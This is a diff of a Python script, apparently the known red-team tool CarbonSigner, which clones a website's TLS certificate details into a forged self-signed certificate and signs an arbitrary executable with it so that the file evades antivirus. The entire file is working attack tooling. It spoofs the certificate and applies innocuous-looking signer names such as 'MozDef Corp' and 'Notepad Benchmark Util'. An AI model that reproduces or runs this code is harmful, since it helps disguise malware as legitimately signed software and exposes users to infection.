@@ -1,48 +1,61 @@
 #!/usr/bin/python3
 
-# Author : Paranoid Ninja
-# Email  : paranoidninja@protonmail.com
-# Description: Spoofs SSL Certificates and Signs executables to evade Antivirus
+## Author : Paranoid Ninja
+## Email  : paranoidninja@protonmail.com
+## Desc   : Spoofs SSL Certificates and Signs executables to evade Antivirus
 
-import os
+import logging
+from OpenSSL import crypto
+from sys import argv, platform
+from pathlib import Path
 import shutil
 import ssl
 import subprocess
-from OpenSSL import crypto
-from pathlib import Path
-from sys import argv, platform
-import logging
+import os
 
+# Set up logging
+logging.basicConfig(level=logging.INFO)
+
+# Constants
 TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"
 
-# Configure logging for better traceability
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-
-def fetch_certificate(host, port):
-    """Fetches the SSL certificate of the given host and port."""
+def create_pfx_with_openssl(cert_file, key_file, pfx_file):
+    """Create a PFX file using the OpenSSL command line tool."""
     try:
+        command = [
+            "openssl", "pkcs12", "-export", "-out", str(pfx_file),
+            "-inkey", str(key_file), "-in", str(cert_file)
+        ]
+        subprocess.check_call(command)
+        return pfx_file
+    except subprocess.CalledProcessError as e:
+        logging.error(f"Error creating PFX file: {e}")
+    except Exception as e:
+        logging.error(f"Unexpected error: {e}")
+    return None
+
+def CarbonCopy(host, port, signee, signed):
+    try:
+        # Fetching Details
         logging.info(f"Loading public key of {host} in memory...")
         ogcert = ssl.get_server_certificate((host, int(port)))
         x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)
-        return x509
-    except ssl.SSLError as e:
-        logging.error(f"SSL Error: {e}")
-    except Exception as e:
-        logging.error(f"Failed to fetch certificate: {e}")
-    return None
 
-def generate_fake_certificate(x509, certDir, host):
-    """Generates a fake certificate by cloning the original certificate."""
-    try:
+        certDir = Path('certs')
+        certDir.mkdir(exist_ok=True)
+
+        # Creating Fake Certificate
         CNCRT   = certDir / (host + ".crt")
         CNKEY   = certDir / (host + ".key")
         PFXFILE = certDir / (host + ".pfx")
-        
-        # Generate new RSA private key
+
+        # Generate new RSA private key with at least 2048 bits
         k = crypto.PKey()
-        k.generate_key(crypto.TYPE_RSA, x509.get_pubkey().bits())
-        
-        # Clone original certificate's details
+        key_size = max(x509.get_pubkey().bits(), 2048)  # Ensure key size is at least 2048 bits
+        k.generate_key(crypto.TYPE_RSA, key_size)
+
+        # Cloning certificate details
+        logging.info("Cloning Certificate Version...")
         cert = crypto.X509()
         cert.set_version(x509.get_version())
         cert.set_serial_number(x509.get_serial_number())
@@ -53,80 +66,46 @@ def generate_fake_certificate(x509, certDir, host):
         cert.set_pubkey(k)
         cert.sign(k, 'sha256')
 
-        # Save the generated certificate and private key
-        logging.info("Creating certificate and key files...")
+        logging.info(f"Creating certificate and key files...")
         CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
         CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
 
-        # Create PKCS12 file for signing executable
-        logging.info("Creating PFX file...")
-        pfx = crypto.PKCS12()
-        pfx.set_privatekey(k)
-        pfx.set_certificate(cert)
-        pfxdata = pfx.export()
-        PFXFILE.write_bytes(pfxdata)
+        logging.info(f"Creating PFX file using OpenSSL...")
+        pfxfile = create_pfx_with_openssl(CNCRT, CNKEY, PFXFILE)
 
-        return PFXFILE
-    except Exception as e:
-        logging.error(f"Error in generating fake certificate: {e}")
-    return None
+        if not pfxfile:
+            raise Exception("Failed to create PFX file.")
 
-def sign_executable_with_signtool(signee, signed, pfxfile):
-    """Signs the executable using signtool on Windows."""
-    try:
-        logging.info(f"Signing {signed} using signtool...")
-        shutil.copy(signee, signed)
-        subprocess.check_call([
-            "signtool.exe", "sign", "/v", "/f", pfxfile,
-            "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
-            "/td", "SHA256", "/fd", "SHA256", signed
-        ])
-    except subprocess.CalledProcessError as e:
-        logging.error(f"Error signing with signtool: {e}")
-    except Exception as e:
-        logging.error(f"Unexpected error during signing: {e}")
+        if platform == "win32":
+            logging.info(f"Platform is Windows OS...")
+            logging.info(f"Signing {signed} with signtool.exe...")
+            shutil.copy(signee, signed)
+            subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
+                "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
+                "/td", "SHA256", "/fd", "SHA256", signed])
+        else:
+            logging.info(f"Platform is Linux OS...")
+            logging.info(f"Signing {signee} with {PFXFILE} using osslsigncode...")
+            args = ("osslsigncode", "sign", "-pkcs12", PFXFILE,
+                    "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
+                    "-in", signee, "-out", signed)
+            subprocess.check_call(args)
 
-def sign_executable_with_osslsigncode(signee, signed, pfxfile):
-    """Signs the executable using osslsigncode on Linux."""
-    try:
-        logging.info(f"Signing {signed} using osslsigncode...")
-        args = ("osslsigncode", "sign", "-pkcs12", pfxfile,
-                "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
-                "-in", signee, "-out", signed)
-        subprocess.check_call(args)
-    except subprocess.CalledProcessError as e:
-        logging.error(f"Error signing with osslsigncode: {e}")
-    except Exception as e:
-        logging.error(f"Unexpected error during signing: {e}")
-
-def CarbonCopy(host, port, signee, signed):
-    """Main function to clone certificate and sign executable."""
-    certDir = Path('certs')
-    certDir.mkdir(exist_ok=True)
-
-    # Fetch original certificate
-    x509 = fetch_certificate(host, port)
-    if not x509:
-        return
-    
-    # Generate fake certificate
-    PFXFILE = generate_fake_certificate(x509, certDir, host)
-    if not PFXFILE:
-        return
-    
-    # Sign executable based on OS
-    if platform == "win32":
-        sign_executable_with_signtool(signee, signed, PFXFILE)
-    else:
-        sign_executable_with_osslsigncode(signee, signed, PFXFILE)
+    except Exception as ex:
+        logging.error(f"Something went wrong!\nException: {str(ex)}")
 
 def main():
-    """Main entry point."""
-    logging.info("CarbonSigner v1.0")
+    logging.info(""" +-+-+-+-+-+-+-+-+-+-+-+-+
+    |C|a|r|b|o|n|S|i|g|n|e|r|
+    +-+-+-+-+-+-+-+-+-+-+-+-+
+    
+    CarbonSigner v1.0\n  Author: Paranoid Ninja\n""")
+
     if len(argv) != 5:
-        logging.error(f"Usage: {argv[0]} <hostname> <port> <build-executable> <signed-executable>")
-        return
-    CarbonCopy(argv[1], argv[2], argv[3], argv[4])
+        logging.info("[+] Description: Impersonates the Certificate of a website")
+        logging.info("[!] Usage: " + argv[0] + " <hostname> <port> <build-executable> <signed-executable>\n")
+    else:
+        CarbonCopy(argv[1], argv[2], argv[3], argv[4])
 
 if __name__ == "__main__":
     main()
